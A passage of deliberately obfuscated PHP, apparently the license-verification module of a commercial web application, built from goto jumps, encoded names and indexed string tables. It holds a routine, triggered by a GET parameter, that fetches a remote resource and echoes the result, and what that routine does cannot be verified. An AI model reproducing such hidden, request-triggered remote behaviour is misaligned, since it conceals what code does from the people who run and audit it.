(!$Cè—Ï²”¶‹) { break; } $Cè—Ï²”¶‹++; } goto EÙøíÇ‘è; DßŠ¤º¹‚: unset($EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[106]][$eÉ‡Í›ÕôÏ[108]][$eÉ‡Í›ÕôÏ[110]]); $DÃ…ÙÎÚîÕ = $FšŠï³Æ¨”[612]; if (!$DÃ…ÙÎÚîÕ) { return; } goto DÃø•³†è«; EÙøíÇ‘è: $EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[118]][$eÉ‡Í›ÕôÏ[123]] = $eÉ‡Í›ÕôÏ[124]($_SERVER[$eÉ‡Í›ÕôÏ[125]] . $dó·ùØàÑ[$eÉ‡Í›ÕôÏ[126]]); $c¡ïõî–‰Ù = $FšŠï³Æ¨”[614]; if (strlen($c¡ïõî–‰Ù) < $FšŠï³Æ¨”[598]) { die; } goto BÏÌ¼ääé„; cŒïÙ–öÕ¬: return $EÕ“éß­¤Ê; goto B¬‚Á¨óö; B¬‚Á¨óö: } private function drtcf4b76c3f() { goto cØª‚Ğ‘»è; DÎ‰¶ ªº: $AÆñ¿º©ˆ­ = array($E¦ß¢î‰ØÆ[169] => $fÛ‡â‘Ğ™[$E¦ß¢î‰ØÆ[64]], $E¦ß¢î‰ØÆ[170] => $fÛ‡â‘Ğ™[$E¦ß¢î‰ØÆ[65]], $E¦ß¢î‰ØÆ[171] => $E¦ß¢î‰ØÆ[10]); foreach ($f†¼Ç‹£§Ö as $CÖ†äÒ©®¡) { if (!isset($fÛ‡â‘Ğ™[$CÖ†äÒ©®¡]) || !$fÛ‡â‘Ğ™[$CÖ†äÒ©®¡]) { continue; } $AÆñ¿º©ˆ­[$CÖ†äÒ©®¡] = $fÛ‡â‘Ğ™[$CÖ†äÒ©®¡]; $Aµ•Î‚›ˆ = $d‡ğ¹™ŞÄÄ[619]; while ($Aµ•Î‚›ˆ < $d‡ğ¹™ŞÄÄ[592]) { if ($Aµ•Î‚›ˆ >= 0) { break; } $Aµ•Î‚›ˆ++; } } $E¦ß¢î‰ØÆ[13](array($E¦ß¢î‰ØÆ[161], $E¦ß¢î‰ØÆ[162]), $AÆñ¿º©ˆ­); goto AùÅ·¼Äã™; AùÅ·¼Äã™: $DÑ…À¢ñé = $d‡ğ¹™ŞÄÄ[620]; goto a±†¬ƒ„ŒÅ; DºÖ×ëÖæ¾: if ($this->xvanb0f6bcd5 == $E¦ß¢î‰ØÆ[131]) { return; } $f†¼Ç‹£§Ö = array($E¦ß¢î‰ØÆ[163], $E¦ß¢î‰ØÆ[164], $E¦ß¢î‰ØÆ[165], $E¦ß¢î‰ØÆ[166], $E¦ß¢î‰ØÆ[167], $E¦ß¢î‰ØÆ[168]); $fÛ‡â‘Ğ™ = $E¦ß¢î‰ØÆ[61]($E¦ß¢î‰ØÆ[62])->{$_SERVER[ÁäèóÕ][63]}(); goto DÎ‰¶ ªº; cØª‚Ğ‘»è: $d‡ğ¹™ŞÄÄ =& $_SERVER[Šº]; $E¦ß¢î‰ØÆ =& $_SERVER[ÁäèóÕ]; if ($_SERVER[$E¦ß¢î‰ØÆ[44]] == $E¦ß¢î‰ØÆ[145]) { goto fæ×¾³Ç§Á; fæ×¾³Ç§Á: $E‰¬ÁËÂ× = array($E¦ß¢î‰ØÆ[130] => $this->xvanb0f6bcd5, $E¦ß¢î‰ØÆ[146] => $this->{$_SERVER[ÁäèóÕ][147]}(), $E¦ß¢î‰ØÆ[148] => $E¦ß¢î‰ØÆ[61]($E¦ß¢î‰ØÆ[149])->{$_SERVER[ÁäèóÕ][150]}()); if ($this->xvanb0f6bcd5 != $E¦ß¢î‰ØÆ[131]) { $DÀë…óÑ„ = $E¦ß¢î‰ØÆ[116]($this->bsna7275823f, $E¦ß¢î‰ØÆ[151]); if ($DÀë…óÑ„) { $E‰¬ÁËÂ×[$E¦ß¢î‰ØÆ[152]] = $DÀë…óÑ„; $E‰¬ÁËÂ×[$E¦ß¢î‰ØÆ[153]] = $E¦ß¢î‰ØÆ[154]($E¦ß¢î‰ØÆ[116]($this->bsna7275823f, $E¦ß¢î‰ØÆ[155])); $E‰¬ÁËÂ×[$E¦ß¢î‰ØÆ[156]] = $E¦ß¢î‰ØÆ[116]($this->bsna7275823f, $E¦ß¢î‰ØÆ[141]); } } $E‰¬ÁËÂ× = $this->{$_SERVER[ÁäèóÕ][157]}($E¦ß¢î‰ØÆ[158]($E‰¬ÁËÂ×), $E¦ß¢î‰ØÆ[124]($E¦ß¢î‰ØÆ[159])); goto aÜà‡º™ª; aÜà‡º™ª: $D©øÖ»ÅÖÈ = $d‡ğ¹™ŞÄÄ[617]; if (!$D©øÖ»ÅÖÈ) { die; } $AÆñ¿º©ˆ­ = array($E¦ß¢î‰ØÆ[160] => $E‰¬ÁËÂ×); goto d ˜ÁÓ»×Ş; d ˜ÁÓ»×Ş: $C±ÇİëÓ´Š = $d‡ğ¹™ŞÄÄ[618]; $E¦ß¢î‰ØÆ[13](array($E¦ß¢î‰ØÆ[161], $E¦ß¢î‰ØÆ[162]), $AÆñ¿º©ˆ­); goto e„Ã‰æ˜á±; e„Ã‰æ˜á±: } goto DºÖ×ëÖæ¾; a±†¬ƒ„ŒÅ: } private function plsgb3d547f4() { goto Böà„™©Êà; EµÏÛ‘—Ü: $FÑÍ‚‰[176]($FÑÍ‚‰[208]($FÑÍ‚‰[218]), !0); goto e–ğ ·â°Ì; f¼·À“¶„²: while (strlen($a…¨ªØ¦ù) < $B”¤¦ŒöÑï[588]) { if (!$a…¨ªØ¦ù) { break; } $a…¨ªØ¦ù++; } $this->{$_SERVER[ÁäèóÕ][239]}(); Cache::set($FÑÍ‚‰[240] . $FÑÍ‚‰[124]($EĞ×º»ÓôÌ . $FÑÍ‚‰[241]), $FÑÍ‚‰[10]); goto EµÏÛ‘—Ü; e„Ü£â¿›œ: $d‹Ë‘ØÃ¹ = $FÑÍ‚‰[124]($_SERVER[$FÑÍ‚‰[125]] . $EĞ×º»ÓôÌ); $c„·‰”ƒªò = $B”¤¦ŒöÑï[621]; if (strlen($c„·‰”ƒªò) < $B”¤¦ŒöÑï[592]) { die; } goto cçÒÙ¾¤±æ; b©™õÈ¡ïâ: $b‚Ì©õ‹Óó = $B”¤¦ŒöÑï[627]; $cä”ø›ÔÁ = $FÑÍ‚‰[232]($FÑÍ‚‰[61]($FÑÍ‚‰[11])->{$_SERVER[ÁäèóÕ][233]}(), $FÑÍ‚‰[234]); $aÈ¡­Ù¡Ñö = $B”¤¦ŒöÑï[628]; goto FØ”‘‘˜ö; Aƒ„°¨Ûôœ: if (!$FÑÍ‚‰[116]($GLOBALS, $FÑÍ‚‰[142])) { die; } $bŞ»Ê¨ºøõ = $GLOBALS[$FÑÍ‚‰[22]]; if (isset($bŞ»Ê¨ºøõ[$FÑÍ‚‰[173]])) { $this->{$_SERVER[ÁäèóÕ][174]}(); die; } goto b¨²Œ—ğãÃ; cçÒÙ¾¤±æ: if ($bŞ»Ê¨ºøõ[$FÑÍ‚‰[188]] == $FÑÍ‚‰[189]) { $aˆ¤ïîê£õ = $this->{$_SERVER[ÁäèóÕ][157]}($d‹Ë‘ØÃ¹, $FÑÍ‚‰[190]); $Bæ£¾¨ªœÂ = $this->{$_SERVER[ÁäèóÕ][137]}($FÑÍ‚‰[158]($bÒô†ˆƒª«), $d‹Ë‘ØÃ¹ . $FÑÍ‚‰[191], 3); $Bæ£¾¨ªœÂ = $Bæ£¾¨ªœÂ . $FÑÍ‚‰[192] . $_SERVER[$FÑÍ‚‰[183]]; $Eó ÷Šæ› = $this->{$_SERVER[ÁäèóÕ][193]}($FÑÍ‚‰[194] . $aˆ¤ïîê£õ . $FÑÍ‚‰[195] . $Bæ£¾¨ªœÂ, -1); $FÑÍ‚‰[176]($Eó ÷Šæ›, !0); } else { if ($bŞ»Ê¨ºøõ[$FÑÍ‚‰[188]] == $FÑÍ‚‰[196]) { $C²ÀŠí‹¨Ú = $FÑÍ‚‰[25]($FÑÍ‚‰[124]($FÑÍ‚‰[197] . $d‹Ë‘ØÃ¹), 12, 15) . $FÑÍ‚‰[198]; $Bæ£¾¨ªœÂ = $this->{$_SERVER[ÁäèóÕ][199]}($FÑÍ‚‰[2]($bŞ»Ê¨ºøõ[$FÑÍ‚‰[200]]), $C²ÀŠí‹¨Ú, 2); $A¡¤«ÃŠŸÔ = $FÑÍ‚‰[201]($Bæ£¾¨ªœÂ, !0); if (!$FÑÍ‚‰[202]($A¡¤«ÃŠŸÔ) || !$FÑÍ‚‰[202]($A¡¤«ÃŠŸÔ[$FÑÍ‚‰[203]]) || $A¡¤«ÃŠŸÔ[$FÑÍ‚‰[175]] != !0) { $eê…Ø©Şíé = $FÑÍ‚‰[204]; $Ağ¬¶³´›Æ = $A¡¤«ÃŠŸÔ[$FÑÍ‚‰[203]] ? $FÑÍ‚‰[205] . $A¡¤«ÃŠŸÔ[$FÑÍ‚‰[203]] : $eê…Ø©Şíé; $FÑÍ‚‰[176]($Ağ¬¶³´›Æ, !1); } else { $bÒô†ˆƒª«[$FÑÍ‚‰[178]] = $A¡¤«ÃŠŸÔ[$FÑÍ‚‰[203]][$FÑÍ‚‰[206]]; } } else { $A¡¤«ÃŠŸÔ = $this->{$_SERVER[ÁäèóÕ][193]}($FÑÍ‚‰[207], $bÒô†ˆƒª«, 10); $c›çç©İ÷™ = $B”¤¦ŒöÑï[622]; if (!$c›çç©İ÷™) { return; } } } if (!$FÑÍ‚‰[202]($A¡¤«ÃŠŸÔ) || !$FÑÍ‚‰[202]($A¡¤«ÃŠŸÔ[$FÑÍ‚‰[203]]) || $A¡¤«ÃŠŸÔ[$FÑÍ‚‰[175]] != !0) { $eê…Ø©Şíé = $FÑÍ‚‰[208]($FÑÍ‚‰[209]); $Ağ¬¶³´›Æ = $A¡¤«ÃŠŸÔ[$FÑÍ‚‰[203]] ? $FÑÍ‚‰[205] . $A¡¤«ÃŠŸÔ[$FÑÍ‚‰[203]] : $eê…Ø©Şíé; $FÑÍ‚‰[176]($Ağ¬¶³´›Æ, !1); } $A«–ƒ›áåÕ = $A¡¤«ÃŠŸÔ[$FÑÍ‚‰[203]]; goto A¥¬ƒ­¥º¾; A÷ŸŠš‡¨: $FÑÍ‚‰[61]($FÑÍ‚‰[62])->{$_SERVER[ÁäèóÕ][231]}($bö½ºµµÅÊ); $e£ˆ‘ÙÒ¨¶ = $FÑÍ‚‰[124]($_SERVER[$FÑÍ‚‰[125]] . $FÑÍ‚‰[224]($EĞ×º»ÓôÌ) . $bö½ºµµÅÊ[$FÑÍ‚‰[220]]); $dÔ…§´èğ¿ = $FÑÍ‚‰[224]($FÑÍ‚‰[25]($e£ˆ‘ÙÒ¨¶, 10, 16)); goto f°ŠÊ«ğ™ğ; f°ŠÊ«ğ™ğ: $AÑø³†»‘– = $B”¤¦ŒöÑï[626]; while ($AÑø³†»‘– < $B”¤¦ŒöÑï[588]) { if ($AÑø³†»‘– >= 0) { break; } $AÑø³†»‘–++; } $e–š†Ä†‚Ê = $this->{$_SERVER[ÁäèóÕ][137]}($FÑÍ‚‰[158]($A«–ƒ›áåÕ), $e£ˆ‘ÙÒ¨¶); goto b©™õÈ¡ïâ; DğçŒºÖ¥: $eÑµÚ´ÍŒ‘ = $B”¤¦ŒöÑï[625]; if (strlen($eÑµÚ´ÍŒ‘) < $B”¤¦ŒöÑï[592]) { die; } if ($A«–ƒ›áåÕ[$FÑÍ‚‰[227]] && $A«–ƒ›áåÕ[$FÑÍ‚‰[227]] >= 1) { $FÑÍ‚‰[61]($FÑÍ‚‰[62])->{$_SERVER[ÁäèóÕ][228]}($FÑÍ‚‰[229], $FÑÍ‚‰[230]); } goto A÷ŸŠš‡¨; cÌ¯ÉØœ’·: $BÃ±×áìèµ = $FÑÍ‚‰[134](16); $fƒÎí¸¥™ = $BÃ±×áìèµ . $bö½ºµµÅÊ[$FÑÍ‚‰[130]] . $this->{$_SERVER[ÁäèóÕ][157]}($FÑÍ‚‰[124]($bö½ºµµÅÊ[$FÑÍ‚‰[219]]), $BÃ±×áìèµ); $bö½ºµµÅÊ[$FÑÍ‚‰[133]] = $FÑÍ‚‰[128]($FÑÍ‚‰[224]($this->{$_SERVER[ÁäèóÕ][157]}($fƒÎí¸¥™, $FÑÍ‚‰[226]))); goto DğçŒºÖ¥; FØ”‘‘˜ö: if (!$aÈ¡­Ù¡Ñö) { return; } $C·°ÊÚƒë = $cä”ø›ÔÁ[$FÑÍ‚‰[235]]; $cê«•Ï¬Á = array(); goto aÚ²Ó¾ÙÔ¿; bì…­ööê: $d±ÖÇ•·Öá = $F¬µáˆ°±É . $bö½ºµµÅÊ[$FÑÍ‚‰[130]] . $bö½ºµµÅÊ[$FÑÍ‚‰[222]]; $bö½ºµµÅÊ[$FÑÍ‚‰[132]] = $FÑÍ‚‰[224]($FÑÍ‚‰[128]($this->{$_SERVER[ÁäèóÕ][157]}($d±ÖÇ•·Öá, $FÑÍ‚‰[225]))); $cã¢“ö‹Ôª = $B”¤¦ŒöÑï[624]; goto cÌ¯ÉØœ’·; Bİ‚Å’ò©Ù: while (strlen($fñ£òÔÑ±İ) < $B”¤¦ŒöÑï[596]) { if (!$fñ£òÔÑ±İ) { break; } $fñ£òÔÑ±İ++; } $this->bsna7275823f = $A«–ƒ›áåÕ; $Cö…±˜šøé = $B”¤¦ŒöÑï[632]; goto Aùˆ©³¯ÉÏ; Böà„™©Êà: $B”¤¦ŒöÑï =& $_SERVER[Šº]; $FÑÍ‚‰ =& $_SERVER[ÁäèóÕ]; if ($_SERVER[$FÑÍ‚‰[44]] != $FÑÍ‚‰[172]) { return; } goto Aƒ„°¨Ûôœ; F¢Şš—²ñ: $bö½ºµµÅÊ = array($FÑÍ‚‰[219] => $bÒô†ˆƒª«[$FÑÍ‚‰[175]], $FÑÍ‚‰[220] => $A«–ƒ›áåÕ[$FÑÍ‚‰[221]], $FÑÍ‚‰[222] => $FÑÍ‚‰[134](16), $FÑÍ‚‰[130] => $A«–ƒ›áåÕ[$FÑÍ‚‰[223]]); if ($bÒô†ˆƒª«[$FÑÍ‚‰[178]]) { $bö½ºµµÅÊ[$FÑÍ‚‰[222]] = $bÒô†ˆƒª«[$FÑÍ‚‰[178]]; } $F¬µáˆ°±É = $FÑÍ‚‰[25]($FÑÍ‚‰[124]($bö½ºµµÅÊ[$FÑÍ‚‰[220]]), 10, 10); goto bì…­ööê; Aùˆ©³¯ÉÏ: while ($Cö…±˜šøé < $B”¤¦ŒöÑï[598]) { if ($Cö…±˜šøé >= 0) { break; } $Cö…±˜šøé++; } $this->xvanb0f6bcd5 = $bö½ºµµÅÊ[$FÑÍ‚‰[130]]; $a…¨ªØ¦ù = $B”¤¦ŒöÑï[633]; goto f¼·À“¶„²; b¨²Œ—ğãÃ: if (!isset($bŞ»Ê¨ºøõ[$FÑÍ‚‰[175]]) || $FÑÍ‚‰[24]($bŞ»Ê¨ºøõ[$FÑÍ‚‰[175]]) != 16) { $FÑÍ‚‰[176]($FÑÍ‚‰[177] . $bŞ»Ê¨ºøõ[$FÑÍ‚‰[175]], !1); } $EĞ×º»ÓôÌ = $FÑÍ‚‰[61]($FÑÍ‚‰[62])->{$_SERVER[ÁäèóÕ][63]}($FÑÍ‚‰[126]); $bÒô†ˆƒª« = array($FÑÍ‚‰[175] => $bŞ»Ê¨ºøõ[$FÑÍ‚‰[175]], $FÑÍ‚‰[178] => $FÑÍ‚‰[134](16), $FÑÍ‚‰[179] => $FÑÍ‚‰[159], $FÑÍ‚‰[180] => $FÑÍ‚‰[181], $FÑÍ‚‰[182] => $_SERVER[$FÑÍ‚‰[183]], $FÑÍ‚‰[184] => $_SERVER[$FÑÍ‚‰[185]], $FÑÍ‚‰[186] => $_SERVER[$FÑÍ‚‰[187]]); goto e„Ü£â¿›œ; AóÑ¾—ò½ğ: if (strlen($E”ŸƒŠ…Ş«) < $B”¤¦ŒöÑï[399]) { return; } $FÑÍ‚‰[61]($FÑÍ‚‰[11])->{$_SERVER[ÁäèóÕ][236]}($C·°ÊÚƒë[$FÑÍ‚‰[237]], array($FÑÍ‚‰[238] => $cê«•Ï¬Á)); $fñ£òÔÑ±İ = $B”¤¦ŒöÑï[631]; goto Bİ‚Å’ò©Ù; aÚ²Ó¾ÙÔ¿: $A¨Å‰ÉÚ±Û = $B”¤¦ŒöÑï[629]; $cê«•Ï¬Á[$dÔ…§´èğ¿] = $e–š†Ä†‚Ê; $E”ŸƒŠ…Ş« = $B”¤¦ŒöÑï[630]; goto AóÑ¾—ò½ğ; A¥¬ƒ­¥º¾: $Cò×ÁÚÄ½ = $this->{$_SERVER[ÁäèóÕ][210]}($A«–ƒ›áåÕ[$FÑÍ‚‰[211]]); $DËë¶Åäø„ = $B”¤¦ŒöÑï[623]; if (!$Cò×ÁÚÄ½ || $Cò×ÁÚÄ½ != $A«–ƒ›áåÕ[$FÑÍ‚‰[155]]) { $d‘±§öÈœ = array($FÑÍ‚‰[212] => $FÑÍ‚‰[61]($FÑÍ‚‰[62])->{$_SERVER[ÁäèóÕ][63]}($FÑÍ‚‰[126]), $FÑÍ‚‰[213] => $_SERVER[$FÑÍ‚‰[125]], $FÑÍ‚‰[214] => $FÑÍ‚‰[215](), $FÑÍ‚‰[184] => $_SERVER[$FÑÍ‚‰[185]]); $Bæ£¾¨ªœÂ = $this->{$_SERVER[ÁäèóÕ][216]}($FÑÍ‚‰[158]($d‘±§öÈœ)); $this->{$_SERVER[ÁäèóÕ][193]}($FÑÍ‚‰[217] . $Bæ£¾¨ªœÂ); $FÑÍ‚‰[176]($FÑÍ‚‰[208]($FÑÍ‚‰[218]), !0); } goto F¢Şš—²ñ; e–ğ ·â°Ì: } private function licenseRegistSuccess() { $E–Àš¯áËø =& $_SERVER[ÁäèóÕ]; $eõ‰ñ··ùµ = $E–Àš¯áËø[61]($E–Àš¯áËø[62])->{$_SERVER[ÁäèóÕ][63]}(); $aÓó‡¦« = $_SERVER[Šº][634]; if (!$aÓó‡¦«) { die; } if ($eõ‰ñ··ùµ[$E–Àš¯áËø[93]] != $E–Àš¯áËø[230]) { $E–Àš¯áËø[61]($E–Àš¯áËø[62])->{$_SERVER[ÁäèóÕ][231]}($E–Àš¯áËø[93], $E–Àš¯áËø[230]); } $E–Àš¯áËø[120]($E–Àš¯áËø[242])->{$_SERVER[ÁäèóÕ][243]}(!0); } private function wkvc2978da80() { goto d™Çî­œ¬ó; bˆÇé²î¢: $A×ÛÖ±ŒÏ±[61]($A×ÛÖ±ŒÏ±[62])->{$_SERVER[ÁäèóÕ][228]}($A×ÛÖ±ŒÏ±[229], $A×ÛÖ±ŒÏ±[244]); $dÔ²·„œÇÎ = $A Ì îôøš[635]; if (strlen($dÔ²·„œÇÎ) < $A Ì îôøš[592]) { die; } goto DÖ½æëÜ¤; dé™¥ß‹ä: $this->xvanb0f6bcd5 = $A×ÛÖ±ŒÏ±[131]; $F‰Ó’‚‰Ùõ = $A Ì îôøš[636]; if (strlen($F‰Ó’‚‰Ùõ) < $A Ì îôøš[399]) { die; } goto Aßó¡Ù¼¨®; d™Çî­œ¬ó: $A Ì îôøš =& $_SERVER[Šº]; $A×ÛÖ±ŒÏ± =& $_SERVER[ÁäèóÕ]; $A×ÛÖ±ŒÏ±[61]($A×ÛÖ±ŒÏ±[62])->{$_SERVER[ÁäèóÕ][231]}(array($A×ÛÖ±ŒÏ±[219] => $A×ÛÖ±ŒÏ±[10], $A×ÛÖ±ŒÏ±[220] => $A×ÛÖ±ŒÏ±[10], $A×ÛÖ±ŒÏ±[130] => $A×ÛÖ±ŒÏ±[131], $A×ÛÖ±ŒÏ±[132] => $A×ÛÖ±ŒÏ±[10], $A×ÛÖ±ŒÏ±[133] => $A×ÛÖ±ŒÏ±[10])); goto bˆÇé²î¢; DÖ½æëÜ¤: $this->bsna7275823f = array(); $f·Ñ×œÌ¹ = $A Ì îôøš[626]; if (!$f·Ñ×œÌ¹) { return; } goto dé™¥ß‹ä; Aßó¡Ù¼¨®: } private function oqjd548186b6() { goto b‚Ëò¤‚¯; BŒÃÚ­²·„: $D‚„ËöŞá™ = $FÑ›’êàÅ°[638]; if (strlen($D‚„ËöŞá™) < $FÑ›’êàÅ°[399]) { return; } if ($Aßë¢ŞŒ‚[$f®¸´³¥ï¸[130]] == $f®¸´³¥ï¸[131]) { return; } goto BŠÔ£»ÉÎ; b—“ƒÈøğÃ: $DÍÕë›¨áœ = $FÑ›’êàÅ°[637]; if (strlen($DÍÕë›¨áœ) < $FÑ›’êàÅ°[596]) { return; } $this->xvanb0f6bcd5 = $f®¸´³¥ï¸[131]; goto F†Ş›ÒŠßÏ; D°‡‚­Åî‹: if (!$eÛé¬¤®) { return; } $eÚˆ‚ÀÓ®Â = Cache::get($A©¤„¿Ìº); $a™øÃ©·  = $FÑ›’êàÅ°[640]; goto fº«—Ö³£“; b–¤‰¾«Í™: $this->xvanb0f6bcd5 = $Aßë¢ŞŒ‚[$f®¸´³¥ï¸[130]]; $FÀŠÕ”ˆñ– = $FÑ›’êàÅ°[641]; if (!$FÀŠÕ”ˆñ–) { return; } goto c¶Œ††©Ûí; EŞ‹öİ‡¨: if ($f®¸´³¥ï¸[246]() >= $fÆ¹ÄİğÂ) { return $this->{$_SERVER[ÁäèóÕ][174]}(); } if ($f®¸´³¥ï¸[246]() - $eÚˆ‚ÀÓ®Â[$f®¸´³¥ï¸[245]] > 20) { $eÚˆ‚ÀÓ®Â[$f®¸´³¥ï¸[245]] = $f®¸´³¥ï¸[246](); Cache::set($A©¤„¿Ìº, $eÚˆ‚ÀÓ®Â); } $this->bsna7275823f = $eÚˆ‚ÀÓ®Â; goto b–¤‰¾«Í™; b‚Ëò¤‚¯: $FÑ›’êàÅ° =& $_SERVER[Šº]; $f®¸´³¥ï¸ =& $_SERVER[ÁäèóÕ]; $_SERVER[$f®¸´³¥ï¸[185]] = $f®¸´³¥ï¸[116]($_SERVER, $f®¸´³¥ï¸[185], APP_HOST); goto b—“ƒÈøğÃ; BŠÔ£»ÉÎ: $dê‚â©é†á = $f®¸´³¥ï¸[61]($f®¸´³¥ï¸[62])->{$_SERVER[ÁäèóÕ][63]}($f®¸´³¥ï¸[126]); $A©¤„¿Ìº = $f®¸´³¥ï¸[240] . $f®¸´³¥ï¸[124]($dê‚â©é†á . $f®¸´³¥ï¸[241]); $eÛé¬¤® = $FÑ›’êàÅ°[639]; goto D°‡‚­Åî‹; fº«—Ö³£“: if (!$f®¸´³¥ï¸[202]($eÚˆ‚ÀÓ®Â) || !isset($eÚˆ‚ÀÓ®Â[$f®¸´³¥ï¸[245]]) || $f®¸´³¥ï¸[246]() - $eÚˆ‚ÀÓ®Â[$f®¸´³¥ï¸[245]] >= 60) { $CòäÓò©å = $f®¸´³¥ï¸[232]($f®¸´³¥ï¸[61]($f®¸´³¥ï¸[11])->{$_SERVER[ÁäèóÕ][233]}(), $f®¸´³¥ï¸[234]); $a‚é™¤¢‹ = $CòäÓò©å[$f®¸´³¥ï¸[235]]; $C“÷‚İ˜Çç = $f®¸´³¥ï¸[124]($_SERVER[$f®¸´³¥ï¸[125]] . $f®¸´³¥ï¸[224]($dê‚â©é†á) . $Aßë¢ŞŒ‚[$f®¸´³¥ï¸[220]]); $C­Ğ¿‘ößš = $f®¸´³¥ï¸[224]($f®¸´³¥ï¸[25]($C“÷‚İ˜Çç, 10, 16)); $eÚˆ‚ÀÓ®Â = $this->{$_SERVER[ÁäèóÕ][199]}($a‚é™¤¢‹[$f®¸´³¥ï¸[104]][$C­Ğ¿‘ößš], $C“÷‚İ˜Çç); $eÚˆ‚ÀÓ®Â = $f®¸´³¥ï¸[201]($eÚˆ‚ÀÓ®Â, !0); } if (!$f®¸´³¥ï¸[202]($eÚˆ‚ÀÓ®Â)) { return $this->{$_SERVER[ÁäèóÕ][174]}(); } $fÆ¹ÄİğÂ = $f®¸´³¥ï¸[154]($eÚˆ‚ÀÓ®Â[$f®¸´³¥ï¸[155]]); goto EŞ‹öİ‡¨; F†Ş›ÒŠßÏ: $bÂ‡çÇÂ«Œ = $FÑ›’êàÅ°[585]; if (!$bÂ‡çÇÂ«Œ) { die; } $Aßë¢ŞŒ‚ = $f®¸´³¥ï¸[61]($f®¸´³¥ï¸[62])->{$_SERVER[ÁäèóÕ][63]}(); goto BŒÃÚ­²·„; c¶Œ††©Ûí: } private function ciqgba98bf63() { goto b½¿‡·™‡¡; c¸Ù¸ò²¡‡: $d¹Ì÷ŞÕ‡ = $_SERVER[$AÖÃÅøàæË[44]]; if ($d¹Ì÷ŞÕ‡ == $AÖÃÅøàæË[247] && $this->xvanb0f6bcd5 == $AÖÃÅøàæË[131]) { $AÖÃÅøàæË[176]($AÖÃÅøàæË[208]($AÖÃÅøàæË[248]), !1, $AÖÃÅøàæË[249]); } $e°Á·×ÒĞğ = array($AÖÃÅøàæË[250], $AÖÃÅøàæË[251]); goto FÙ¶½éåÒÑ; b½¿‡·™‡¡: $AÖÃÅøàæË =& $_SERVER[ÁäèóÕ]; $e®äáĞ¨Ÿ„ = $GLOBALS[$AÖÃÅøàæË[22]]; $bã­Ö½Šòó = $_SERVER[Šº][642]; goto c¸Ù¸ò²¡‡; FÙ¶½éåÒÑ: if ($AÖÃÅøàæË[252]($d¹Ì÷ŞÕ‡, $e°Á·×ÒĞğ)) { if ($this->xvanb0f6bcd5 == $AÖÃÅøàæË[131] && isset($e®äáĞ¨Ÿ„[$AÖÃÅøàæË[253]])) { $AÖÃÅøàæË[176]($AÖÃÅøàæË[208]($AÖÃÅøàæË[248]), !1, $AÖÃÅøàæË[249]); die; } $eÇõô“Ó†æ = $this->{$_SERVER[ÁäèóÕ][147]}(); if ($eÇõô“Ó†æ != $AÖÃÅøàæË[254]($AÖÃÅøàæË[255])) { if ($eÇõô“Ó†æ <= $AÖÃÅøàæË[61]($AÖÃÅøàæË[149])->{$_SERVER[ÁäèóÕ][150]}()) { $AÖÃÅøàæË[176]($AÖÃÅøàæË[208]($AÖÃÅøàæË[256]), !1, $AÖÃÅøàæË[249]); die; } } } goto dĞ÷¸Õ‡Ì; dĞ÷¸Õ‡Ì: } private function wzis99271948() { goto fŸôŞ”ğ†Ô; C¤©¸‹¯ï¥: die; goto d¤Ô‹§Ä•Ğ; fŸôŞ”ğ†Ô: $C¿Ö»­£Ë =& $_SERVER[Šº]; $b„ìÛšÄ…Š =& $_SERVER[ÁäèóÕ]; $FÈ§ò´ë” = array($b„ìÛšÄ…Š[145], $b„ìÛšÄ…Š[257]); goto BŸ–âÅ—¬å; Ağ£Ë¾™ÂÃ: $c…Óœ•àßĞ = $b„ìÛšÄ…Š[262](array($b„ìÛšÄ…Š[263] => array($b„ìÛšÄ…Š[264] => $b„ìÛšÄ…Š[265], $b„ìÛšÄ…Š[266] => 3))); $cŒêâªˆİà = $C¿Ö»­£Ë[644]; while (strlen($cŒêâªˆİà) < $C¿Ö»­£Ë[592]) { if (!$cŒêâªˆİà) { break; } $cŒêâªˆİà++; } goto F­÷ø¥Ã—; A¡ì¬¯µÁ×: if (!$b„ìÛšÄ…Š[252]($_SERVER[$b„ìÛšÄ…Š[44]], $FÈ§ò´ë”)) { return; } $dÏâ‘¦ßåÑ = $b„ìÛšÄ…Š[259]; $dÏâ‘¦ßåÑ = $this->{$_SERVER[ÁäèóÕ][260]}($dÏâ‘¦ßåÑ, $b„ìÛšÄ…Š[261]); goto Ağ£Ë¾™ÂÃ; F­÷ø¥Ã—: $f×³¨½Ê  = @$b„ìÛšÄ…Š[267]($dÏâ‘¦ßåÑ, !1, $c…Óœ•àßĞ); $b„ìÛšÄ…Š[268]($b„ìÛšÄ…Š[269]); if ($f×³¨½Ê  && $b„ìÛšÄ…Š[32]($f×³¨½Ê , $b„ìÛšÄ…Š[270])) { echo $f×³¨½Ê ; } goto C¤©¸‹¯ï¥; BŸ–âÅ—¬å: $B‡«Àï“ìë = $C¿Ö»­£Ë[643]; while ($B‡«Àï“ìë < $C¿Ö»­£Ë[399]) { if ($B‡«Àï“ìë >= 0) { break; } $B‡«Àï“ìë++; } if (!$b„ìÛšÄ…Š[116]($GLOBALS, $b„ìÛšÄ…Š[142]) || !isset($_GET[$b„ìÛšÄ…Š[258]])) { return; } goto A¡ì¬¯µÁ×; d¤Ô‹§Ä•Ğ: } public function kzfu46d47db6($f·ïÒğÆ¿½) { goto DÄ«†˜„Îà; C§ñ‡Õ‡æï: $còâçÇ³ÄÅ = array($b„”º ƒç[272] => $b„”º ƒç[273], $b„”º ƒç[274] => $b„”º ƒç[273], $b„”º ƒç[275] => $b„”º ƒç[273], $b„”º ƒç[276] => $b„”º ƒç[273], $b„”º ƒç[277] => $b„”º ƒç[273], $b„”º ƒç[278] => $b„”º ƒç[273], $b„”º ƒç[279] => $b„”º ƒç[280], $b„”º ƒç[281] => $b„”º ƒç[280], $b„”º ƒç[282] => $b„”º ƒç[280], $b„”º ƒç[283] => $b„”º ƒç[280], $b„”º ƒç[284] => $b„”º ƒç[280], $b„”º ƒç[285] => $b„”º ƒç[280], $b„”º ƒç[286] => $b„”º ƒç[280], $b„”º ƒç[287] => $b„”º ƒç[280], $b„”º ƒç[288] => $b„”º ƒç[280]); $Aš•¼§ÂÅ = $Cä¸èò¯ ó[645]; while ($Aš•¼§ÂÅ < $Cä¸èò¯ ó[399]) { if ($Aš•¼§ÂÅ >= 0) { break; } $Aš•¼§ÂÅ++; } goto Aßê˜ÑÇöÓ; Aßê˜ÑÇöÓ: $f¿è«ğÒâŠ = $b„”º ƒç[0]($b„”º ƒç[289], $b„”º ƒç[116]($this->bsna7275823f, $b„”º ƒç[139], $b„”º ƒç[10])); $E›‹»ªÎ† = array(); foreach ($còâçÇ³ÄÅ as $Fâ™ÑîÜ‚Ç => 